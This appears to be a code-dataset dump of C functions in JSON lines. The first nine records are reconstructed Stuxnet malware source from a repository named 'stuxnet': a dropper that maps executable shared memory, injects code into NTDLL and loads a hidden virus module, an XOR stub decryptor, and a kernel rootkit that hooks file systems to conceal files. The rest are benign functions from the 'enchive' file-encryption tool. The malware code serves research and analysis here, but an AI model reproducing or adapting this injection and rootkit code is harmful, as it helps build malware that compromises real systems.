{"docstring": "// 85% (C) CODE MATCH -> NEED DEBUG\n", "func_signal": "INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlockPointer, PVOID *pAssemblyCodeBlocksSection)", "code": "{\n\tHANDLE pSectionHandle;\n\tPVOID pBaseAddr1 = 0;\n\tPVOID pViewBase = 0;\n\tINT32 iSectionPointer = 0;\n\n\n\tUINT32 iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)\n\tUINT32 iASMBlock1Size = _SIZE(DecodeFunctionNameA, __ASM_BLOCK1_0);\n\tUINT32 iASMBlock0Size = _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0);\n\n\tUINT32 iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock0Size + iASMBlock1Size + iCodeBlockSize;\n\n\n\t// Because hHandle = GetCurrentProcess(), pBaseAddr1 == pViewBase\n\tINT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pViewBase);\n\tif(!iOpenMapViewFailed)\n\t\treturn iOpenMapViewFailed;\n\n\tPASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;\n\n\t// Pointer to first address to write\n\tPVOID pCurrBase           = (PVOID)((DWORD)pBaseAddr1 + sizeof(ASM_CODE_BLOCKS_HEADER));\n\n\t// Offset from baseAddr of where we're currently writing\n\tiSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);\n\n\tCopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, iASMBlock1Size);\n\n\tCopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, iASMBlock0Size);\n\n\tPVOID pCodeBlock = (PVOID)GetCodeBlock(sASMCodeBlocksHeader);\n\tCopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);\n\n\t// Basically memcpy:\n\t//   *__ASM_BLOCK0_1 = &__ASM_REF_3\n\t//   I have no idea why.\n\tDWORD *tmp = (DWORD *)((DWORD)sASMCodeBlocksHeader + sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock1Size + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));\n\t*tmp = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);\n\n\t// Put function address into the memory map\n\tsASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();\n\tsASMCodeBlocksHeader->AlignAddresses = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeAlignAddressesPointer();\n\tsASMCodeBlocksHeader->VirusModuleSection = (DWORD)pVirusModuleSection;\n\n\t// Put the values in the pointers\n\t*pCodeBlockPointer          = (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;\n\t*pAssemblyCodeBlocksSection = pViewBase;\n\n\t// Close and unmap the first section\n\tg_hardAddrs.UnmapViewOfFile(sASMCodeBlocksHeader);\n\tg_hardAddrs.ZwClose(pSectionHandle);\n\n\treturn 0;\n}", "path": "stuxnet/Dropper/MemorySections.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 100% (C) CODE MATCH\n", "func_signal": "INT32 SharedMapViewOfSection(HANDLE hHandle, SIZE_T iSectionSize, PHANDLE pSectionHandle, PVOID *pBaseAddr1, PVOID *pBaseAddr2)", "code": "{\n\tSIZE_T iViewSize; // [sp+0h] [bp-10h]@1\n\tNTSTATUS iStatus; // [sp+4h] [bp-Ch]@3\n\tLARGE_INTEGER liMaximumSize; // [sp+8h] [bp-8h]@1\n\n\tiViewSize = iSectionSize;\n\t\n\tliMaximumSize.LowPart  = iSectionSize;\n\tliMaximumSize.HighPart = 0;\n\t\n\tif(STATUS_SUCCESS != g_hardAddrs.ZwCreateSection(pSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0))// (..., 0xF001F, 0, ..., 64, 0x8000000, 0)\n\t\treturn -5;\n\t\n\tiStatus = g_hardAddrs.ZwMapViewOfSection(*pSectionHandle, GetCurrentProcess(), pBaseAddr1, 0, 0, 0, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)\n\tif(iStatus != STATUS_SUCCESS) return -5;\n\t\n\tiStatus = g_hardAddrs.ZwMapViewOfSection(*pSectionHandle, hHandle            , pBaseAddr2, 0, 0, 0, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)\n\tif(iStatus != STATUS_SUCCESS) return -5;\n\t\n\treturn 0;\n}", "path": "stuxnet/Dropper/Utils.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    File Checking\n\n----------------------------------------------------------------------**/\n", "func_signal": "ULONG GetOffsets(ULONG FileInformationClass,ULONG* EndOfFile,ULONG* FilenameOffset,ULONG* FilenameLength)", "code": "{\n  switch (FileInformationClass) {\n   case FileBothDirectoryInformation : \n         *EndOfFile = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, EndOfFile);\n         *FilenameOffset = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName);\n   case FileDirectoryInformation:\n      *EndOfFile = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, EndOfFile);\n      *FilenameOffset = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName);\n   case FileFullDirectoryInformation:\n      *EndOfFile = FIELD_OFFSET( FILE_FULL_DIR_INFORMATION , EndOfFile);\n      *FilenameOffset = FIELD_OFFSET( FILE_FULL_DIR_INFORMATION , FileName);\n   case FileIdBothDirectoryInformation:\n      *EndOfFile = FIELD_OFFSET( FILE_ID_BOTH_DIR_INFORMATION, EndOfFile);\n      *FilenameOffset = FIELD_OFFSET( FILE_ID_BOTH_DIR_INFORMATION, FileName);\n   case FileIdFullDirectoryInformation:\n      *EndOfFile = FIELD_OFFSET( FILE_ID_FULL_DIR_INFORMATION, EndOfFile);\n      *FilenameOffset = FIELD_OFFSET( FILE_ID_FULL_DIR_INFORMATION, FileName);\n   case FileNamesInformation:\n      *EndOfFile = -1;\n      *FilenameOffset = FIELD_OFFSET( FILE_NAMES_INFORMATION, FileName);\n      *FilenameLength = FIELD_OFFSET(FILE_NAMES_INFORMATION, FileNameLength);\n      return 1;\n    default:\n      return 0;\n  };\n  *FilenameLength = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileNameLength);\n  return 1;\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 96% (C) CODE MATCH\n", "func_signal": "INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader, PGENERAL_INFO_BLOCK sInfoBlock)", "code": "{\n\tHMODULE pVirusModule; // [sp+0h] [bp-90h]@5\n\tHANDLE hMappedAddress; // [sp+4h] [bp-8Ch]@7\n\tINT32 iResult; // [sp+8h] [bp-88h]@1\n\tPHARDCODED_ADDRESSES pHardAddrs; // [sp+Ch] [bp-84h]@1\n\n\tGENERAL_INFO_BLOCK sInfoBlockCopy;\n\t__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK)); // Copy the information\n\n\tsInfoBlockCopy.OriginalAddress ^= XADDR_KEY; // Get the original address of the variable sInfoBlock\n\tsInfoBlockCopy.UnknownZero0     = 0;\n\n\t// Point to g_hardAddrs in memory\n\tpHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));\n\n\tiResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);\n\tif(iResult)\n\t\treturn iResult\n\n\tif(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs))\n\t\treturn -4;\n\n\t/* Load library from the memory */\n\tpVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);\n\tif(!pVirusModule) return -9;\n\n\tsVirusModuleBlocksHeader->VirusModulePointer = pVirusModule;\n\thMappedAddress = sInfoBlockCopy.MappedAddress;\n\n\tif(sInfoBlockCopy.MappedAddress)\n\t{\n\t\tsInfoBlockCopy.MappedAddress = 0;\n\t\tpHardAddrs->ZwClose(hMappedAddress);\n\t}\n\n\treturn 0;\n}", "path": "stuxnet/Dropper/MemorySections.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    Hooking File Systems\n\n----------------------------------------------------------------------**/\n", "func_signal": "NTSTATUS HookingFileSystems()", "code": "{\n     UNICODE_STRING SystemRoutineName;\n     int i;\n     ULONG (*FunctionAddress)();\n     RtlInitUnicodeString(&SystemRoutineName,aObreferenceobjectbyname);\n     FunctionAddress = MmGetSystemRoutineAddress(&SystemRoutineName);\n     if (FunctionAddress == 0)return 0;\n     for (i = 0; i < 3;i++){\n        HookOne(FunctionAddress,FileSystemsArray[i]);\n     };\n     return STATUS_SUCCESS;\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 100% (C) CODE MATCH\n", "func_signal": "INT32 GetRandomModuleName(GENERAL_INFO_BLOCK *sInfoBlock, LPCWSTR szDebugLibraryName)", "code": "{\n\tWCHAR __KERNEL32_DLL_ASLR_08x[42]; // [sp+8h] [bp-58h]@5\n\tDWORD dwRandom; // [sp+5Ch] [bp-4h]@5\n\n\tif(szDebugLibraryName)\n\t{\n\t\tif(lstrlenW(szDebugLibraryName) >= 31) return -1;\n\t\tlstrcpyW(sInfoBlock->RandomLibraryName, szDebugLibraryName);\n\t}\n\telse\n\t{\n\t\tdwRandom = GetTickCount() + 3 * GetCurrentThreadId();\n\t\tDecodeModuleNameW((WCHAR *)ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);\n\t\t\n\t\tdo\n\t\t\twsprintfW(sInfoBlock->RandomLibraryName, __KERNEL32_DLL_ASLR_08x, dwRandom++);\n\t\twhile(GetModuleHandleW(sInfoBlock->RandomLibraryName));\n\t\t// Defeat ASLR by checking every single address.\n\t}\n\t\n\tsInfoBlock->OriginalAddress = XADDR_KEY ^ (UINT32)sInfoBlock;\n\tsInfoBlock->UnknownZero0 = 0;\n\tsInfoBlock->AlignAddressesFunction = (DWORD)BLOCK4_AlignAddresses;\n\t\n\treturn 0;\n}", "path": "stuxnet/Dropper/Utils.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 98% (C) CODE MATCH\n", "func_signal": "void DecryptSTUBSection(char *pSectionSTUB, UINT32 pSectionVirtualSize)", "code": "{\n\tUINT32 iFirstXOR; // edx@2\n\tUINT32 iSecondXOR; // eax@4\n\tUINT32 i;\n\tINT32 iTotalCycles; // [sp+8h] [bp-8h]@1\n\tUINT32 iCyclesSecondXOR; // [sp+Ch] [bp-4h]@1\n\n\tiCyclesSecondXOR = pSectionVirtualSize / 2;\n\tiTotalCycles = 4;\n\tdo\n\t{\n\t\tiFirstXOR = 0;\n\t\tif(pSectionVirtualSize)\n\t\t{\n\t\t\tdo\n\t\t\t{\n\t\t\t\tpSectionSTUB[iFirstXOR] ^= -106 * iFirstXOR;\n\t\t\t\t++iFirstXOR;\n\t\t\t}\n\t\t\twhile(iFirstXOR < pSectionVirtualSize);\n\t\t}\n\n\t\tiSecondXOR = 0;\n\t\tif(iCyclesSecondXOR)\n\t\t{\n\t\t\tdo\n\t\t\t{\n\t\t\t\tpSectionSTUB[iSecondXOR] ^= *(&pSectionSTUB[(pSectionVirtualSize + 1) / 2] + iSecondXOR);\n\t\t\t\t++iSecondXOR;\n\t\t\t}\n\t\t\twhile(iSecondXOR < iCyclesSecondXOR);\n\t\t}\n\n\t\tfor(i = pSectionVirtualSize - 1; i >= 1; --i)\n\t\t\tpSectionSTUB[i] -= pSectionSTUB[i - 1];\n\n\t\t--iTotalCycles;\n\t}\n\twhile(iTotalCycles >= 0);\n}", "path": "stuxnet/Dropper/STUBHandler.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 99% (C) CODE MATCH\n", "func_signal": "void CopySegmentIntoSections(PVOID *pSharedSection1, PVOID pSharedSection2, INT32 *pSectionPointer, PSECTION_SEGEMENT_INFO sSegment, PVOID pSegmentContent, UINT32 iSegmentSize)", "code": "{\n\tif(iSegmentSize) __memcpy(*pSharedSection1, pSegmentContent, iSegmentSize);\n\n\tsSegment->SegmentAddress = (DWORD)pSharedSection2 + *pSectionPointer;\n\tsSegment->SegmentSize = iSegmentSize;\n\t\n\t*pSharedSection1  = pSharedSection1 + iSegmentSize;\n\t*pSectionPointer += iSegmentSize;\n}", "path": "stuxnet/Dropper/Utils.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    Attaching Device\n\n----------------------------------------------------------------------**/\n", "func_signal": "VOID AttachDevice(PDEVICE_OBJECT TargetDevice)", "code": "{\n  \n    PDEVICE_OBJECT SourceDevice;\n    if (TargetDevice->DeviceType == FILE_DEVICE_DISK_FILE_SYSTEM || TargetDevice->DeviceType == FILE_DEVICE_CD_ROM_FILE_SYSTEM || TargetDevice->DeviceType ==  FILE_DEVICE_NETWORK_FILE_SYSTEM)\n    {\n      if (IsAllreadyAttached(TargetDevice) == TRUE) return;\n      if (CreateDevice(TargetDevice,&SourceDevice) != STATUS_SUCCESS)return;\n      SettingFlags(SourceDevice,TargetDevice);\n      SetZero(SourceDevice->DeviceExtension,0);\n      if (AttachToStack(SourceDevice,TargetDevice,SourceDevice->DeviceExtension)!= TRUE){\n          IoDeleteDevice(SourceDevice);\n          return;        \n      };\n    };\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**\n * Return non-zero if path exists and is a directory.\n */\n", "func_signal": "static int\ndir_exists(const char *path)", "code": "{\n    struct stat info;\n    return !stat(path, &info) && S_ISDIR(info.st_mode);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Update cleanup registry to indicate FILE has been closed.\n */\n", "func_signal": "static void\ncleanup_closed(FILE *file)", "code": "{\n    unsigned i;\n    for (i = 0; i < sizeof(cleanup) / sizeof(*cleanup); i++) {\n        if (file == cleanup[i].file) {\n            cleanup[i].file = 0;\n            return;\n        }\n    }\n    abort();\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Initialize a SHA-256 context for HMAC-SHA256.\n * All message data will go into the resulting context.\n */\n", "func_signal": "static void\nhmac_init(SHA256_CTX *ctx, const uint8_t *key)", "code": "{\n    int i;\n    uint8_t pad[SHA256_BLOCK_SIZE];\n    sha256_init(ctx);\n    for (i = 0; i < SHA256_BLOCK_SIZE; i++)\n        pad[i] = key[i] ^ 0x36U;\n    sha256_update(ctx, pad, sizeof(pad));\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Attempt to unambiguously parse the user's command into an enum.\n */\n", "func_signal": "static enum command\nparse_command(char *command)", "code": "{\n    int found = COMMAND_UNKNOWN;\n    size_t len = strlen(command);\n    int ncommands = sizeof(command_names) / sizeof(*command_names);\n    int i;\n    for (i = 0; i < ncommands; i++) {\n        if (strncmp(command, command_names[i], len) == 0) {\n            if (found >= 0)\n                return COMMAND_AMBIGUOUS;\n            found = i;\n        }\n    }\n    return found;\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Print a nice fingerprint of a key.\n */\n", "func_signal": "static void\nprint_fingerprint(const uint8_t *key)", "code": "{\n    int i;\n    uint8_t hash[32];\n    SHA256_CTX sha[1];\n\n    sha256_init(sha);\n    sha256_update(sha, key, 32);\n    sha256_final(sha, hash);\n    for (i = 0; i < 16; i += 4) {\n        unsigned long chunk =\n            ((unsigned long)hash[i + 0] << 24) |\n            ((unsigned long)hash[i + 1] << 16) |\n            ((unsigned long)hash[i + 2] <<  8) |\n            ((unsigned long)hash[i + 3] <<  0);\n        printf(\"%s%08lx\", i ? \"-\" : \"\", chunk);\n    }\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Print a non-fatal warning message.\n */\n", "func_signal": "static void\nwarning(const char *fmt, ...)", "code": "{\n    va_list ap;\n    va_start(ap, fmt);\n    fprintf(stderr, \"warning: \");\n    vfprintf(stderr, fmt, ap);\n    fputc('\\n', stderr);\n    va_end(ap);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Load the public key from the file.\n */\n", "func_signal": "static void\nload_pubkey(const char *file, uint8_t *key)", "code": "{\n    FILE *f = fopen(file, \"rb\");\n    if (!f)\n        fatal(\"failed to open key file for reading '%s' -- %s\",\n              file, strerror(errno));\n    if (!fread(key, 32, 1, f))\n        fatal(\"failed to read key file '%s'\", file);\n    fclose(f);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Print a message, cleanup, and exit the program with a failure code.\n */\n", "func_signal": "static void\nfatal(const char *fmt, ...)", "code": "{\n    unsigned i;\n    va_list ap;\n    va_start(ap, fmt);\n    fprintf(stderr, \"enchive: \");\n    vfprintf(stderr, fmt, ap);\n    fputc('\\n', stderr);\n    for (i = 0; i < sizeof(cleanup) / sizeof(*cleanup); i++) {\n        if (cleanup[i].file)\n            fclose(cleanup[i].file);\n        if (cleanup[i].name)\n            remove(cleanup[i].name);\n    }\n    va_end(ap);\n    exit(EXIT_FAILURE);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Attempt to load and decrypt the secret key stored in a file.\n *\n * If the key is encrypted, attempt to query a key agent. If that\n * fails (no agent, bad key) prompt the user for a passphrase. If that\n * fails (wrong passphrase), abort the program.\n *\n * If \"global_agent_timeout\" is non-zero, start a key agent if\n * necessary.\n */\n", "func_signal": "static void\nload_seckey(const char *file, uint8_t *seckey)", "code": "{\n    FILE *secfile;\n    chacha_ctx cha[1];\n    SHA256_CTX sha[1];\n    uint8_t buf[8 + 4 + 20 + 32];            /* entire key file contents */\n    uint8_t protect[32];                     /* protection key */\n    uint8_t protect_hash[SHA256_BLOCK_SIZE]; /* hash of protection key */\n    int iexp;\n    int version;\n\n    uint8_t *buf_iv           = buf + SECFILE_IV;\n    uint8_t *buf_iterations   = buf + SECFILE_ITERATIONS;\n    uint8_t *buf_version      = buf + SECFILE_VERSION;\n    uint8_t *buf_protect_hash = buf + SECFILE_PROTECT_HASH;\n    uint8_t *buf_seckey       = buf + SECFILE_SECKEY;\n\n    /* Read the entire file into buf. */\n    secfile = fopen(file, \"rb\");\n    if (!secfile)\n        fatal(\"failed to open key file for reading '%s' -- %s\",\n              file, strerror(errno));\n    if (!fread(buf, sizeof(buf), 1, secfile))\n        fatal(\"failed to read key file -- %s\", file);\n    fclose(secfile);\n\n    version = buf_version[0];\n    if (version != ENCHIVE_FORMAT_VERSION)\n        fatal(\"secret key version mismatch -- expected %d, got %d\",\n              ENCHIVE_FORMAT_VERSION, version);\n\n    iexp = buf_iterations[0];\n    if (iexp) {\n        /* Secret key is encrypted. */\n        int agent_success = agent_read(protect, buf_iv);\n        if (agent_success) {\n            /* Check validity of agent key. */\n            sha256_init(sha);\n            sha256_update(sha, protect, 32);\n            sha256_final(sha, protect_hash);\n            agent_success = !memcmp(protect_hash, buf_protect_hash, 20);\n        }\n\n        if (!agent_success) {\n            /* Ask user for passphrase. */\n            char pass[ENCHIVE_PASSPHRASE_MAX];\n            get_passphrase(pass, sizeof(pass), \"passphrase: \");\n            key_derive(pass, protect, iexp, buf_iv);\n\n            /* Validate passphrase. */\n            sha256_init(sha);\n            sha256_update(sha, protect, sizeof(protect));\n            sha256_final(sha, protect_hash);\n            if (memcmp(protect_hash, buf_protect_hash, 20) != 0)\n                fatal(\"wrong passphrase\");\n        }\n\n        /* We have the correct protection key. Start the agent? */\n        if (!agent_success && global_agent_timeout)\n            agent_run(protect, buf_iv);\n\n        /* Decrypt the key into the output. */\n        chacha_keysetup(cha, protect, 256);\n        chacha_ivsetup(cha, buf_iv);\n        chacha_encrypt(cha, buf_seckey, seckey, 32);\n    } else {\n        /* Key is unencrypted, copy into output. */\n        memcpy(seckey, buf_seckey, 32);\n    }\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Return 1 if file exists, or 0 if it doesn't.\n */\n", "func_signal": "static int\nfile_exists(char *filename)", "code": "{\n    FILE *f = fopen(filename, \"r\");\n    if (f) {\n        fclose(f);\n        return 1;\n    }\n    return 0;\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Write the secret key to a file, encrypting it if necessary.\n */\n", "func_signal": "static void\nwrite_seckey(char *file, const uint8_t *seckey, int iexp)", "code": "{\n    FILE *secfile;\n    chacha_ctx cha[1];\n    SHA256_CTX sha[1];\n    uint8_t buf[8 + 1 + 3 + 20 + 32] = {0}; /* entire file contents */\n    uint8_t protect[32];\n\n    uint8_t *buf_iv           = buf + SECFILE_IV;\n    uint8_t *buf_iterations   = buf + SECFILE_ITERATIONS;\n    uint8_t *buf_version      = buf + SECFILE_VERSION;\n    uint8_t *buf_protect_hash = buf + SECFILE_PROTECT_HASH;\n    uint8_t *buf_seckey       = buf + SECFILE_SECKEY;\n\n    buf_version[0] = ENCHIVE_FORMAT_VERSION;\n\n    if (iexp) {\n        /* Prompt for a passphrase. */\n        char pass[2][ENCHIVE_PASSPHRASE_MAX];\n        get_passphrase(pass[0], sizeof(pass[0]),\n                       \"protection passphrase (empty for none): \");\n        if (!pass[0][0]) {\n            /* Nevermind. */\n            iexp = 0;\n        }  else {\n            get_passphrase(pass[1], sizeof(pass[0]),\n                           \"protection passphrase (repeat): \");\n            if (strcmp(pass[0], pass[1]) != 0)\n                fatal(\"protection passphrases don't match\");\n\n            /* Generate an IV to double as salt. */\n            secure_entropy(buf_iv, 8);\n\n            key_derive(pass[0], protect, iexp, buf_iv);\n            buf_iterations[0] = iexp;\n\n            sha256_init(sha);\n            sha256_update(sha, protect, sizeof(protect));\n            sha256_final(sha, buf_protect_hash);\n        }\n    }\n\n    if (iexp) {\n        /* Encrypt using key derived from passphrase. */\n        chacha_keysetup(cha, protect, 256);\n        chacha_ivsetup(cha, buf_iv);\n        chacha_encrypt(cha, seckey, buf_seckey, 32);\n    } else {\n        /* Copy key to output buffer. */\n        memcpy(buf_seckey, seckey, 32);\n    }\n\n    secfile = secure_creat(file);\n    if (!secfile)\n        fatal(\"failed to open key file for writing '%s'\", file);\n    cleanup_register(secfile, file);\n    if (!fwrite(buf, sizeof(buf), 1, secfile))\n        fatal(\"failed to write key file '%s'\", file);\n    cleanup_closed(secfile);\n    if (fclose(secfile))\n        fatal(\"failed to flush key file '%s' -- %s\", file, strerror(errno));\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Generate a Curve25519 public key from a secret key.\n */\n", "func_signal": "static void\ncompute_public(uint8_t *p, const uint8_t *s)", "code": "{\n    static const uint8_t b[32] = {9};\n    curve25519_donna(p, s, b);\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Dump the public key to a file, aborting on error.\n */\n", "func_signal": "static void\nwrite_pubkey(char *file, uint8_t *key)", "code": "{\n    FILE *f = fopen(file, \"wb\");\n    if (!f)\n        fatal(\"failed to open key file for writing '%s' -- %s\",\n              file, strerror(errno));\n    cleanup_register(f, file);\n    if (!fwrite(key, 32, 1, f))\n        fatal(\"failed to write key file '%s'\", file);\n    cleanup_closed(f);\n    if (fclose(f))\n        fatal(\"failed to flush key file '%s' -- %s\", file, strerror(errno));\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Register a file for deletion should fatal() be called.\n */\n", "func_signal": "static void\ncleanup_register(FILE *file, char *name)", "code": "{\n    if (file) {\n        unsigned i;\n        for (i = 0; i < sizeof(cleanup) / sizeof(*cleanup); i++) {\n            if (!cleanup[i].name) {\n                cleanup[i].name = name;\n                cleanup[i].file = file;\n                return;\n            }\n        }\n    }\n    abort();\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Generate a brand new Curve25519 secret key from system entropy.\n */\n", "func_signal": "static void\ngenerate_secret(uint8_t *s)", "code": "{\n    secure_entropy(s, 32);\n    s[0] &= 248;\n    s[31] &= 127;\n    s[31] |= 64;\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
{"docstring": "/**\n * Encrypt from file to file using key/iv, aborting on any error.\n */\n", "func_signal": "static void\nsymmetric_encrypt(FILE *in, FILE *out, const uint8_t *key, const uint8_t *iv)", "code": "{\n    static uint8_t buffer[2][CHACHA_BLOCKLENGTH * 1024];\n    uint8_t mac[SHA256_BLOCK_SIZE];\n    SHA256_CTX hmac[1];\n    chacha_ctx ctx[1];\n\n    chacha_keysetup(ctx, key, 256);\n    chacha_ivsetup(ctx, iv);\n    hmac_init(hmac, key);\n\n    for (;;) {\n        size_t z = fread(buffer[0], 1, sizeof(buffer[0]), in);\n        if (!z) {\n            if (ferror(in))\n                fatal(\"error reading plaintext file\");\n            break;\n        }\n        sha256_update(hmac, buffer[0], z);\n        chacha_encrypt(ctx, buffer[0], buffer[1], z);\n        if (!fwrite(buffer[1], z, 1, out))\n            fatal(\"error writing ciphertext file\");\n        if (z < sizeof(buffer[0]))\n            break;\n    }\n\n    hmac_final(hmac, key, mac);\n\n    if (!fwrite(mac, sizeof(mac), 1, out))\n        fatal(\"error writing checksum to ciphertext file\");\n    if (fflush(out))\n        fatal(\"error flushing to ciphertext file -- %s\", strerror(errno));\n}", "path": "enchive/src/enchive.c", "commit_date": "2020-05-18 00:00:00", "repo_name": "skeeto/enchive", "stars": 616, "license": "unlicense", "language": "c", "size": 173}
